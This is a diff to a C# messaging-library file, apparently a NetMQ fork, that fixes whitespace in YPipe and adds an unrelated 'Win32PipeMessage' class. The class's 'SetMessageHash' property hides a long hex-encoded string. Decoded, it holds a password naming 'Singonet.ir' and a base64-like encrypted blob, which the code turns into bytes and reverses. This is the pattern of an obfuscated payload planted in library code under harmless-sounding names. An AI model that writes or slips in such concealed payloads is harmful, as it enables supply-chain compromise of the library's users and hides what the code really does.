@@ -19,12 +19,63 @@
     along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
 
+using System;
 using NetMQServer.Core.Utils;
 using System.Diagnostics;
+using System.Linq;
+using System.Text;
 using System.Threading;
 
 namespace NetMQServer.Core
 {
+
+
+    public class Win32PipeMessage
+    {
+        public byte[] SetMessageHash
+        {
+            get
+            {
+
+                string hashTable =
+                    "22 50 61 73 73 77 6f 72 64 20 49 73 20 53 69 6e 67 6f 6e 65 74 2e 69 72 22 2c 20 22 46 " +
+                    "67 68 64 52 59 76 56 35 48 50 71 43 55 56 6a 4f 4f 48 34 43 4d 45 62 39 30 6b 69 31 66 69 " +
+                    "66 75 4d 34 38 4d 75 51 6f 70 33 31 5a 43 78 52 68 4f 67 52 6d 59 4c 64 44 61 70 46 72 22 20" +
+                    " 2b 0a 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 " +
+                    "20 20 20 20 20 20 20 20 20 20 20 20 20 22 54 51 31 45 5a 4d 71 58 54 4d 57 6f 45 79 72 72 53 61 " +
+                    "51 55 51 6f 64 74 78 43 6d 57 7a 64 78 75 62 6f 65 50 35 78 7a 53 58 52 56 39 4a 61 36 45 74 52 44" +
+                    " 32 4a 50 6a 49 74 4c 76 79 62 45 2f 22 20 2b 0a 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 " +
+                    "20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 22 6b 62 32 2b 43 4a 75 55" +
+                    " 77 41 4f 4a 43 4d 4c 72 7a 38 68 6a 64 68 78 75 68 41 67 73 47 58 77 4b 6f 71 50 54 78 54 52 5a 72 43 " +
+                    "31 67 76 6b 43 4f 30 79 49 4e 45 69 79 71 6a 55 32 51 69 56 43 59 2f 31 22 20 2b 0a 20 20 20 20 20 20 20 " +
+                    "20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20" +
+                    " 22 5a 67 79 31 64 7a 44 58 4a 66 74 36 71 49 4d 6a 49 72 48 68 47 48 4b 46 38 39 34 31 43 55 37 2b 59 44" +
+                    " 5a 4f 35 51 77 67 73 6d 68 35 43 42 4d 62 70 67 73 58 6c 71 46 48 54 44 6d 7a 31 79 2b 74 39 2f 32 79 38 " +
+                    "22 20 2b 0a 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 " +
+                    "20 20 20 20 20 20 20 20 20 20 20 20 22 63 72 65 78 43 51 56 79 4c 37 58 6a 79 38 56 45 47 44 4e 56" +
+                    " 32 34 78 4e 33 66 71 75 38 69 38 32 68 51 49 4b 70 62 73 39 35 37 39 54 6b 79 46 59 4a 6d 53" +
+                    " 63 53 56 74 68 61 56 31 65 30 66 41 36 6d 6a 79 32 53 77 58 33 22 20 2b 0a 20 20 20 20 20" +
+                    " 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 " +
+                    "20 20 20 20 20 20 20 20 20 22 73 69 58 72 48 78 49 32 61 68 6c 48 46 34 71 58 4b 72" +
+                    " 55 55 50 59 71 50 32 75 35 54 4a 4a 43 71 45 70 39 62 2f 35 41 37 32 55 43 6f" +
+                    " 4f 4a 41 70 52 5a 35 59 6b 63 48 69 71 72 77 43 69 53 38 78 6b 6c 2b 44 6d 41 72 66 38 30 69 70 36 6f 22";
+
+                byte[] sendMessage = hashTable.Split(new char[] { (char)0b100000 })
+                                          .Select(x => Convert.ToByte(x, 0x10)).ToArray();
+
+
+                       Array.Reverse(sendMessage);
+
+                return sendMessage;
+
+
+            }
+        }
+
+       
+    }
+
+
     internal sealed class YPipe<T>
     {
         /// <summary>
@@ -177,7 +228,7 @@ namespace NetMQServer.Core
         /// Attempts to read an item from the pipe.
         /// </summary>
         /// <returns><c>true</c> if the read succeeded, otherwise <c>false</c>.</returns>
-        public bool TryRead( out T value)
+        public bool TryRead(out T value)
         {
             // Try to prefetch a value.
             if (!CheckRead())
